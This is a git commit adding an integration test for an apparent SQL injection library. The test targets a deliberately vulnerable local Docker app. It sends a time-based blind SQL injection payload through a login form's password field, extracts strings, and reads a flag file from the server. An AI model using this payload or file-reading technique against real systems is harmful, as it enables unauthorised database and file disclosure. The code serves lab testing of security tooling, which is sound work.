193c57474a6d44c22177ce94829278063db009b7
manufrommars <dev@lacourarie.org>
2019-07-28 21:54:43 +0200

    Add integration test for calibrate.

---
+++ itests/test_CalibrateTimeBasedblindStringFinder.py
@@ -0,0 +1,30 @@
+import logging
+import requests
+from unittest import TestCase
+from pyic import BlindStringFinder, SqliEncoder, TimeBlindTester
+
+
+class TestCalibrateTimeBasedBlindStringFinder(TestCase):
+    """
+    This test need the docker sqli in https://github.com/NeuronAddict/vulnerable-apps.git running
+    """
+
+    def setUp(self):
+        tester = TimeBlindTester(
+            lambda payload: requests.post('http://127.0.0.1:8181/login.php', data={'login': 'admin',
+                                                                                   'pass': "' OR ( ({}) AND sleep(3) ) #".format(
+                                                                                       payload)}),
+        )
+
+        self.string_finder = BlindStringFinder(tester)
+
+    def test_str_length(self):
+        self.assertEqual(self.string_finder.str_length("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
+                         6)
+
+    def test_read_string(self):
+        self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
+                         'coucou')
+
+    def test_read_file(self):
+        self.assertEqual(self.string_finder.read_file('/var/www/html/flag.txt'), 'dee8cha8moh9ahyeM4atheemi\n')
